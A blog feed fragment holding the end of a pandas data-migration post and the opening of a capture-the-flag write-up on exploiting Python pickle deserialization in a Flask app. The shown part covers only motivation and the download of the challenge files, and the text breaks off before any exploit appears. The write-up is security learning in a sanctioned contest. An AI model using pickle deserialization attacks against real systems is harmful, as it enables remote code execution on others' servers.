style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">Output JSON files</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">output_folder</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"../assets_to_send"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Every file in asset folder is called after the batch number * 100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># So first file is called '100.json' per each folder ('./tickets/100.json', './users/100.json', './comments/100.json')</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># The last file is called './comments_split/2100400.json</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2100400</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;output_filename</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output_folder</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"backup_tickets_{}.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Generating JSON for batch {}..."</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token comment" style="color:#999988;font-style:italic"># Create root JSON object</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"comments"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"users"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"organizations"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> asset </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> assets</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_ticket_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">tickets_dir</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"{}.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_comments_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">comments_dir</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"{}.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_users_file </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">users_dir</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"{}.json"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_ticket_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tickets</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_ticket_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> convert_dates</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ticket_out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> tickets</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ticket_out_dict </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ticket_out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">update</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">'data'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> ticket_out_dict</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_users_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;users </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_users_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> convert_dates</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;users_out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;users_out_dict </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">users_out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">update</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">'users'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> users_out_dict</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> os</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_comments_file</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comments </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">current_comments_file</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> convert_dates</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comments_out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> comments</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comments_out_dict </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">comments_out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"data"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"tickets"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">update</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">'comments'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> comments_out_dict</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Writing ticket JSON to file '{}'..."</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output_filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">output_filename</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'w'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoding</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dump</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">root</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> indent</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I compressed the generated assets into an archive which contained 21k JSON files:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> tf backup_tickets.tar.gz </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">head</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1605900.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1670800.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1585100.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1217200.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1344500.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_990600.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1331400.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_1262300.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./backup_tickets_171600.json</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">tar</span><span class="token plain"> tf backup_tickets.tar.gz</span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">wc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;</span><span class="token number" style="color:#36acaa">21004</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Migration complete!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Bash" term="Bash"/>
        <category label="Data_engineering" term="Data_engineering"/>
        <category label="Jq" term="Jq"/>
        <category label="Migration" term="Migration"/>
        <category label="Pandas" term="Pandas"/>
        <category label="Python" term="Python"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angstrom CTF2021 | Exploiting Python Pickle in Flask Web App]]></title>
        <id>https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask</id>
        <link href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>Recently, I became interested in understanding a bit more about web application exploitation. This interest evolved with my daily work with web applications over the last few years, reviewing already developed web application source code, modifying it at times in order to resolve a customer issue and needing to dive deep and debug customer problems in production.
But I always felt that my daily work was only focusing on how to resolve an issue for a customer. I never branched out to actually understanding the security behind the web applications and services I’m debug and the code I was reviewing and modifying. Moreover, I felt that I was not able to identify any security vulnerabilities in the applications I was working with.
So I challenged to take this next step in learning more about web application security vulnerabilities by signing up to <a href="https://2021.angstromctf.com/" target="_blank" rel="noopener noreferrer">ångstromCTF 2021</a>, an annual capture-the-flag competition hosted by Montgomery Blair High School (ironically located very near to the high school I attended in Maryland).
This post describes the process by which I was able to finish one of the challenges called Jar under the Web category.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="initial-setup">Initial Setup<a href="https://kbbgl.github.io/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask#initial-setup" class="hash-link" aria-label="Direct link to Initial Setup" title="Direct link to Initial Setup">​</a></h2>
<p>When clicking on the particular challenge, you are presented with the following modal:</p>
<p><img decoding="async" loading="lazy" alt="modal" src="https://kbbgl.github.io/assets/images/modal-eae7974c81cadde35073fa353aa304b1.png" width="1901" height="1013" class="img_ev3q"></p>
<p>It includes a link to the web application, a <code>Dockerfile</code>, <code>jar.py</code> and an image of a pickle (<code>pickle.jpg</code>). I downloaded all files, opened the directory in Visual Studio Code, built and ran the docker image:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mkdir</span><span class="token plain"> jar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> jar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">code </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> </span><span class="token builtin class-name">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/jar.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/Dockerfile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> 